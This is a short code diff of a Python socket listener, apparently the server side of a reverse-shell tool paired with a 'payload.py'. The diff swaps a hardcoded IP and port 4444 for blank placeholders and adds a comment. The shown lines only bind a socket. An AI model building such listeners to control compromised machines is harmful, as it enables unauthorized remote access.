@@ -2,11 +2,12 @@ import socket
 import time
 
 
-IP = '192.168.1.5'
-PORT = 4444
+IP = '' # Add the IP of the target machine
+PORT = '' # Add port *same value lies in payload.py
 PREFIX = 'utf-8'# 'ISO-8859-7'
 WIN_PREFIX = 'utf-8'#"windows-1252"
 
+#Create connection by binding a socket
 listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 listener.bind((IP, PORT))
